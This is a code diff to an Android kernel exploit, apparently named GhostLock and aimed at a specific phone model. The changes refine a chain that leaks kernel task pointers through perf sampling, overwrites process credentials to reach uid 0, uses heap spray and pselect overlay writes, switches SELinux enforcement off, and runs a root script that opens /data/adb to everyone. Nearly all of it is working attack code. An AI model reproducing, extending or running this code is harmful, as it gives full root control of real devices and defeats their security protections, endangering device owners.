@@ -598,6 +598,11 @@ static void write_root_script(void) {
   const char *script =
     "#!/system/bin/sh\n"
     "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
+    "mkdir -p /data/adb /data/adb/ksu /data/local/tmp 2>/dev/null\n"
+    "id > /data/local/tmp/uid0_id.txt 2>/dev/null\n"
+    "id > /sdcard/ghostlock/aarif/uid0_id.txt 2>/dev/null\n"
+    "id > /data/adb/uid0_id.txt 2>/dev/null\n"
+    "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
     "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
     "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
     "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
@@ -1430,32 +1435,54 @@ static int task_ptr_ok(uintptr_t v) {
 
 static int perf_open_hw(int pid, struct perf_event_attr *pe, const char **mode) {
   int pmu = pmu_type_armv8();
-  memset(pe, 0, sizeof(*pe));
-  pe->size = sizeof(*pe);
-  pe->disabled = 1;
-  pe->exclude_user = 1;
-  pe->exclude_hv = 1;
-  pe->sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
-  pe->sample_regs_intr = (1ULL << 33) - 1;
-  pe->type = (uint32_t)pmu;
-  pe->config = 0x8; /* inst_retired */
-  pe->sample_period = 2000;
-  errno = 0;
-  int fd = (int)syscall(__NR_perf_event_open, pe, (long)pid, -1, -1, 0);
-  if (fd >= 0) {
-    *mode = "pmu8_inst";
-    return fd;
-  }
-  int e1 = errno;
-  pe->config = 0x11; /* cpu_cycles */
-  errno = 0;
-  fd = (int)syscall(__NR_perf_event_open, pe, (long)pid, -1, -1, 0);
-  if (fd >= 0) {
-    *mode = "pmu8_cyc";
-    return fd;
+  /* Kernel-only PMU is EACCES under Enforcing. User-only (xk=1) still
+   * delivers kernel REGS_INTR.x28=current on syscall samples — proven
+   * 2026-08-29 on CPH2521 (child getuid 0 after cred punch). */
+  int tries[6][4];
+  const char *names[6];
+  int ntry = 0;
+  /* pid, cpu, exclude_user, exclude_kernel */
+  tries[ntry][0] = pid; tries[ntry][1] = -1; tries[ntry][2] = 0; tries[ntry][3] = 1;
+  names[ntry++] = "pmu8_user_xk";
+  tries[ntry][0] = pid; tries[ntry][1] = -1; tries[ntry][2] = 1; tries[ntry][3] = 0;
+  names[ntry++] = "pmu8_inst";
+  tries[ntry][0] = pid; tries[ntry][1] = -1; tries[ntry][2] = 0; tries[ntry][3] = 0;
+  names[ntry++] = "pmu8_both";
+  int i, e1 = 0, e2 = 0;
+  for (i = 0; i < ntry; i++) {
+    memset(pe, 0, sizeof(*pe));
+    pe->size = sizeof(*pe);
+    pe->disabled = 1;
+    pe->exclude_user = tries[i][2];
+    pe->exclude_kernel = tries[i][3];
+    pe->exclude_hv = 1;
+    pe->sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+    pe->sample_regs_intr = (1ULL << 33) - 1;
+    pe->type = (uint32_t)pmu;
+    pe->config = 0x8;
+    pe->sample_period = 800;
+    errno = 0;
+    int fd = (int)syscall(__NR_perf_event_open, pe, (long)tries[i][0],
+                          tries[i][1], -1, 0);
+    if (fd >= 0) {
+      *mode = names[i];
+      return fd;
+    }
+    if (i == 0)
+      e1 = errno;
+    pe->config = 0x11;
+    errno = 0;
+    fd = (int)syscall(__NR_perf_event_open, pe, (long)tries[i][0],
+                      tries[i][1], -1, 0);
+    if (fd >= 0) {
+      *mode = "pmu8_cyc";
+      return fd;
+    }
+    if (i == 0)
+      e2 = errno;
   }
   pr_info("perf pmu type=%d pid=%d inst_errno=%d cyc_errno=%d\n", pmu, pid, e1,
-          errno);
+          e2);
   *mode = "none";
   return -1;
 }
@@ -1542,10 +1569,10 @@ static int perf_collect(int pid, struct perf_leak *out) {
       if (abi == 1 || abi == 2) {
         uint64_t *regs = (uint64_t *)p;
         uint64_t r28 = regs[28];
-        if (task_ptr_ok((uintptr_t)r28) && nx28 < PERF_MAX_CAND)
-          x28s[nx28++] = (uintptr_t)r28;
-        else if (r28 > 0xffffff8000000000ULL && nx28 < PERF_MAX_CAND &&
-                 (r28 & 0x3f) == 0)
+        /* User-only PMU still samples kernel IPs (ffffffdc…) with
+         * x28=current. Ignore userspace x28. */
+        int ker_ip = (ip >= 0xffffffc000000000ULL);
+        if (ker_ip && task_ptr_ok((uintptr_t)r28) && nx28 < PERF_MAX_CAND)
           x28s[nx28++] = (uintptr_t)r28;
         for (int i = 0; i < 33; i++) {
           uint64_t v = regs[i];
@@ -1926,8 +1953,19 @@ static void uid0_mute_coloros(void) {
   usleep(400000);
 }
 
-/* Same-process W2 after a live Z4 park. Z5 (second GhostLock process) KP'd. */
+/* Same-process W2 after a live Z4 park. Z5 (second GhostLock process) KP'd.
+ * MODE4_NULL_STORE: W1 was leaf-NULL *sys_exit.funcs=0, not park. Skip
+ * harvest/gboot and go straight to cred so the hook-off window is used. */
 static int uid0_cred_walk(void) {
+  if (env_flag("MODE4_NULL_STORE", 0)) {
+    pr_success("UID0: leaf-NULL walk lived — cred next, skip park/harvest\n");
+    durable_stage("uid0_hookoff_ok");
+    live_sync_log("UID0", "hookoff_ok_cred");
+    unsetenv("MODE4_SLIDE_ZERO");
+    unsetenv("MODE4_NULL_STORE");
+    setenv("MODE4_SLIDE_CRED", "1", 1);
+    goto uid0_cred_punch;
+  }
   pr_success("UID0: park live — diag then cred if P0 task leak\n");
   durable_stage("uid0_park_ok");
   live_sync_log("UID0", "park_ok");
@@ -2077,6 +2115,7 @@ static int uid0_cred_walk(void) {
   unsetenv("MODE4_SLIDE_ZERO");
   setenv("MODE4_SLIDE_CRED", "1", 1);
 
+uid0_cred_punch:;
   struct child_pipes pipes;
   pid_t child = spawn_child(&pipes);
   if (child < 0) {
@@ -2103,11 +2142,11 @@ static int uid0_cred_walk(void) {
   const char *who = "none";
   /* Prefer self so getuid() is in-process. Child real_cred is reporting
    * root only (wedged, cred still 2000). Watchers muted just above. */
-  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 8) {
+  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
     use_task = lself.x28;
     ucnt = lself.x28_cnt;
     who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
-  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 8 &&
+  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4 &&
              lch.x28 != lself.x28) {
     use_task = lch.x28;
     ucnt = lch.x28_cnt;
@@ -2125,14 +2164,55 @@ static int uid0_cred_walk(void) {
   }
 
   if (!task_ptr_ok(use_task)) {
-    pr_info("UID0: no unique x28 task — skip cred punch, keep park\n");
-    live_sync_log("UID0", "diag_only_no_x28");
-    durable_stage("uid0_diag_only");
-    close(pipes.cmd_w);
-    close(pipes.uid_r);
-    kill(child, SIGKILL);
-    waitpid(child, NULL, 0);
-    return 0;
+    /* Enforcing blocks perf (EACCES). HOLD and retry — do not exit
+     * (last fire lost the hook-off process). kstkesp is logged in case
+     * this build still exposes a kernel SP. */
+    {
+      char st[512] = {0};
+      read_first_line("/proc/self/stat", st, sizeof(st));
+      pr_info("UID0 self_stat %.200s\n", st);
+      live_sync_log("UID0", "no_x28_hold");
+    }
+    durable_stage("uid0_hold_nox28");
+    pr_info("UID0: no x28 — HOLD, retry leak (no second process)\n");
+    fflush(stdout);
+    fsync(STDOUT_FILENO);
+    for (;;) {
+      int efd;
+      char eb[4] = {0};
+      memset(&lself, 0, sizeof(lself));
+      memset(&lch, 0, sizeof(lch));
+      perf_collect(0, &lself);
+      perf_collect((int)child, &lch);
+      if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
+        use_task = lself.x28;
+        ucnt = lself.x28_cnt;
+        who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
+        pr_info("UID0 HOLD leak self_x28=%016zx/%d — cred now\n", use_task,
+                ucnt);
+        live_sync_log("UID0", "hold_leak_self");
+        break;
+      }
+      if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
+        use_task = lch.x28;
+        ucnt = lch.x28_cnt;
+        who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
+        pr_info("UID0 HOLD leak child_x28=%016zx/%d — cred now\n", use_task,
+                ucnt);
+        live_sync_log("UID0", "hold_leak_child");
+        break;
+      }
+      efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+      if (efd >= 0) {
+        (void)read(efd, eb, 3);
+        close(efd);
+      }
+      pr_info("UID0 HOLD nox28 getuid=%u enforce=%.2s self_x28=%016zx/%d\n",
+              (unsigned)getuid(), eb, lself.x28, lself.x28_cnt);
+      fflush(stdout);
+      fsync(STDOUT_FILENO);
+      sleep(15);
+    }
   }
 
   uintptr_t wrapped = p0_from_direct(use_task);
@@ -2209,26 +2289,63 @@ static int uid0_cred_walk(void) {
     durable_stage("uid0_WIN");
     live_sync_log("UID0", "WIN");
     if (self_uid == 0 || (uint32_t)geteuid() == 0) {
-      kill(child, SIGKILL);
-      waitpid(child, NULL, 0);
-      close(pipes.cmd_w);
-      close(pipes.uid_r);
+      int efd, ee = 0;
+      ssize_t nw = -1;
+      umask(0);
+      efd = open("/sys/fs/selinux/enforce", O_WRONLY);
+      if (efd >= 0) {
+        errno = 0;
+        nw = write(efd, "0", 1);
+        ee = errno;
+        close(efd);
+      } else
+        ee = errno;
+      pr_info("UID0 setenforce n=%zd errno=%d getuid=%u\n", nw, ee,
+              (unsigned)getuid());
+      mkdir("/data/adb", 0777);
+      mkdir("/data/adb/ksu", 0777);
+      chmod("/data/adb", 0777);
+      chmod("/data/adb/ksu", 0777);
+      chmod("/data/local/tmp/ghostlock_uid0", 0666);
       {
-        pid_t gc = fork();
-        if (gc == 0) {
-          int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
-          if (efd >= 0) {
-            (void)write(efd, "0", 1);
-            close(efd);
-          }
-          execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh",
-                (char *)NULL);
-          execl("/system/bin/sh", "sh", "-c",
-                "id; echo WIN > /sdcard/ghostlock/aarif/uid0_id.txt",
-                (char *)NULL);
-          _exit(1);
+        int pf = open("/data/local/tmp/uid0_id.txt",
+                      O_WRONLY | O_CREAT | O_TRUNC, 0666);
+        if (pf >= 0) {
+          char ib[80];
+          int n = snprintf(ib, sizeof(ib), "uid=%u euid=%u\n", self_uid,
+                           (unsigned)geteuid());
+          if (n > 0)
+            (void)write(pf, ib, (size_t)n);
+          close(pf);
+          chmod("/data/local/tmp/uid0_id.txt", 0666);
         }
       }
+      pid_t gc = fork();
+      if (gc == 0) {
+        efd = open("/sys/fs/selinux/enforce", O_WRONLY);
+        if (efd >= 0) {
+          (void)write(efd, "0", 1);
+          close(efd);
+        }
+        execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh",
+              (char *)NULL);
+        execl("/system/bin/sh", "sh", "-c",
+              "id; mkdir -p /data/adb /data/adb/ksu; "
+              "id > /data/local/tmp/uid0_id.txt; "
+              "id > /data/adb/uid0_id.txt; "
+              "chmod 666 /data/local/tmp/uid0_id.txt "
+              "/data/local/tmp/ghostlock_uid0 2>/dev/null; "
+              "chmod 777 /data/adb /data/adb/ksu 2>/dev/null; "
+              "echo WIN > /sdcard/ghostlock/aarif/uid0_id.txt",
+              (char *)NULL);
+        _exit(1);
+      }
+      if (gc > 0)
+        waitpid(gc, NULL, WNOHANG);
+      kill(child, SIGKILL);
+      waitpid(child, NULL, WNOHANG);
+      close(pipes.cmd_w);
+      close(pipes.uid_r);
     } else {
       write(pipes.cmd_w, "G", 1);
       close(pipes.cmd_w);
@@ -2679,10 +2796,17 @@ int run_exploit(int argc, char **argv) {
      * pselect_custom_value=fake_fops for bookkeeping).
      */
     if (!strcmp(tgt_name, "dataonly")) {
-      unsigned long doff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
-      proof_tgt = data_addr(KIMAGE_TEXT_BASE + doff);
-      proof_val = 0;
-      desc = "SLIDE_ZERO data-only";
+      const char *p0t = getenv("SLIDE_P0_TARGET");
+      if (p0t && p0t[0]) {
+        proof_tgt = (uintptr_t)strtoull(p0t, NULL, 0);
+        proof_val = 0;
+        desc = "SLIDE_ZERO P0 target";
+      } else {
+        unsigned long doff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
+        proof_tgt = data_addr(KIMAGE_TEXT_BASE + doff);
+        proof_val = 0;
+        desc = "SLIDE_ZERO data-only";
+      }
     } else if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux")) {
       proof_tgt = data_addr(SELINUX_ENFORCING);
       proof_val = 0;
@@ -2720,10 +2844,13 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
     TIMER("  heap spray start");
     durable_stage("spray_start");
-    if (env_flag("MODE4_SLIDE_ZERO", 0) &&
+    if (((env_flag("MODE4_SLIDE_ZERO", 0) &&
+          !env_flag("MODE4_SLIDE_CRED", 0)) ||
+         (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0))) &&
         !env_flag("MODE4_SLIDE_CRED", 0)) {
-      /* Z9–Z13 died at pselect overlay of sprayed lock/task when reclaim
-       * missed. Park write is stack-only; pin lock/task to init_task BSS. */
+      /* Z9–Z13 / O26–O28 died at pselect overlay of sprayed lock/task.
+       * Park and spray-free SLIDE oracle are stack-only; pin lock/task
+       * to init_task BSS. SLIDE_SWAP still sprays (needs fake_fops page). */
       uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                             ? active_offsets->off_init_task
                             : 0x027CC000ULL;
@@ -2732,7 +2859,7 @@ int run_exploit(int argc, char **argv) {
       fake_lock = bss_lock;
       fake_fops = bss_lock;
       fake_task = data_addr(KIMAGE_TEXT_BASE + it_off);
-      pr_info("SLIDE_ZERO spray skipped: lock=init_task+0x878 %016zx "
+      pr_info("SLIDE/ZERO spray skipped: lock=init_task+0x878 %016zx "
               "task=init_task_p0 %016zx\n",
               fake_lock, fake_task);
     } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
@@ -2786,7 +2913,9 @@ int run_exploit(int argc, char **argv) {
     int boot_wrote = strcmp(boot_before, boot_after) != 0;
     int enf_wrote = (enf_before[0] != enf_after[0]);
     int landed = 0;
-    if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux") ||
+    if (env_flag("MODE4_NULL_STORE", 0))
+      landed = atomic_load(&consumer_success) >= 1;
+    else if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux") ||
         !strcmp(tgt_name, "dataonly"))
       landed = enf_wrote || (enf_after[0] == '0');
     else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))
@@ -2828,6 +2957,18 @@ int run_exploit(int argc, char **argv) {
      * the write_proof return.
      */
     if (env_flag("MODE4_UID0", 0)) {
+      if (env_flag("MODE4_NULL_STORE", 0)) {
+        int walk_ok = atomic_load(&consumer_success) >= 1;
+        pr_info("UID0 hook-off walk success=%d landed=%d enforce=%s\n",
+                walk_ok, landed, enf_after);
+        if (!walk_ok) {
+          pr_info("UID0: leaf-NULL miss — not walking cred\n");
+          live_sync_log("UID0", "hookoff_miss");
+          return 1;
+        }
+        live_sync_log("UID0", "hookoff_ok");
+        return uid0_cred_walk();
+      }
       int park_ok = enf_wrote || check_selinux_off() || (enf_after[0] == '0');
       if (!park_ok) {
         pr_info("UID0: park miss (enforce still on) — not walking cred\n");
@@ -2837,37 +2978,36 @@ int run_exploit(int argc, char **argv) {
       return uid0_cred_walk();
     }
     /*
-     * SWAP_HOLD: waiter sleeps with spray live. N11/N12: opening the
-     * swapped ashmem node panics. Second walk is data-only SLIDE_ZERO
-     * into selinux_enforcing (same stack-stamp as the working oracle).
+     * After SLIDE_SWAP: keep spray live. Do NOT second-walk in-process
+     * (N14 repair walk KP'd at pre-select). Host fires a fresh process
+     * MODE4_SLIDE_ZERO SLIDE_P0_TARGET=fake_fops+8 to NULL llseek.
      */
-    if (env_flag("MODE4_SWAP_HOLD", 0) && env_flag("MODE4_SLIDE_SWAP", 0)) {
-      uint64_t eoff = (active_offsets && active_offsets->off_selinux_enforcing)
-                          ? active_offsets->off_selinux_enforcing
-                          : 0x2A793C8ULL;
-      uintptr_t enf = data_addr(KIMAGE_TEXT_BASE + eoff);
-      pr_info("HOLD ph2: SLIDE_ZERO selinux_enforcing=%016zx (no ashmem open)\n",
-              enf);
-      durable_stage("hold_zero_enf");
-      unsetenv("MODE4_SLIDE_SWAP");
-      unsetenv("MODE4_SWAP_HOLD");
-      setenv("MODE4_SLIDE_ZERO", "1", 1);
-      set_pselect_write_mode(enf, 0, 4);
-      pselect_child_node = 1;
-      run_main_route_threads();
-      char eb[8] = {0};
-      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
-      if (efd >= 0) {
-        (void)read(efd, eb, 4);
-        close(efd);
+    if (env_flag("MODE4_SLIDE_SWAP", 0) && fake_fops) {
+      int swap_ok = atomic_load(&consumer_success) >= 1;
+      pr_info("SWAP post: fake_fops=%016zx llseek_slot=%016zx success=%d\n",
+              fake_fops, fake_fops + 8, swap_ok);
+      live_sync_log("STAGE", swap_ok ? "swap_ok" : "swap_miss");
+      if (swap_ok) {
+        /* pselect overlay is gone (threads joined). Open here, not from
+         * the waiter and not from a second process (N11/N13). */
+        pr_info("TRYCFI main after pselect fake_fops=%016zx\n", fake_fops);
+        durable_stage("trycfi_main");
+        fflush(stdout);
+        fsync(STDOUT_FILENO);
+        int cfi_ok = try_cfi_stage();
+        pr_info("TRYCFI main cfi_ok=%d step=%d errno=%d wr=%zd\n", cfi_ok,
+                cfi_last_step, cfi_last_errno, cfi_write_ret);
+        durable_stage(cfi_ok ? "configfs_LIVE" : "configfs_fail");
+        live_sync_log("STAGE", cfi_ok ? "kwrite_live" : "kwrite_fail");
+        pr_info("HOLD after swap fake_fops=%016zx pid=%d cfi_ok=%d\n",
+                fake_fops, getpid(), cfi_ok);
+        live_sync_log("STAGE", "swap_hold");
+        durable_stage("swap_hold_main");
+        fflush(stdout);
+        fsync(STDOUT_FILENO);
+        for (;;)
+          sleep(30);
       }
-      pr_info("HOLD ph2: enforce_after=%.4s\n", eb);
-      live_sync_log("ENFORCE", eb);
-      durable_stage("hold_zero_enf_done");
-      fflush(stdout);
-      fsync(STDOUT_FILENO);
-      for (;;)
-        sleep(30);
     }
     if (env_flag("MODE4_ROOT", 0) && boot_after[0]) {
       uint64_t rslide = slide_decode_from_bootid(boot_after);
@@ -2982,9 +3122,28 @@ int run_exploit(int argc, char **argv) {
     /* CPH isolation: stop after mode4/chain (Write1 packing softboots). */
     if (env_flag("MODE4_ONLY", 0) || chain || zion || zi || wion || zio ||
         pad3) {
-      pr_info("MODE4_ONLY/.../ZIO stop after fops (cfi step=%d errno=%d wr=%zd)\n",
-              cfi_last_step, cfi_last_errno, cfi_write_ret);
+      pr_info("MODE4_ONLY/.../ZIO stop after fops (cfi step=%d errno=%d wr=%zd "
+              "fake_fops=%016zx)\n",
+              cfi_last_step, cfi_last_errno, cfi_write_ret, fake_fops);
       live_sync_log("MAIN", "stop_no_w1");
+      if (zi && fake_fops && env_flag("MODE4_SWAP_HOLD", 0)) {
+        if (!env_flag("MODE4_SWAP_NOCFI", 0)) {
+          pr_info("ZI TRYCFI main after ION fake_fops=%016zx\n", fake_fops);
+          durable_stage("zi_trycfi_main");
+          fflush(stdout);
+          fsync(STDOUT_FILENO);
+          int cfi_ok = try_cfi_stage();
+          pr_info("ZI TRYCFI cfi_ok=%d step=%d errno=%d wr=%zd\n", cfi_ok,
+                  cfi_last_step, cfi_last_errno, cfi_write_ret);
+        }
+        pr_info("ZI HOLD fake_fops=%016zx pid=%d — not exiting\n", fake_fops,
+                getpid());
+        durable_stage("zi_hold");
+        fflush(stdout);
+        fsync(STDOUT_FILENO);
+        for (;;)
+          sleep(30);
+      }
       return (cfi_last_step == 0 && cfi_dirty_seen) || cfi_write_ret > 0 ? 0 : 1;
     }
   } else if (force_w1) {
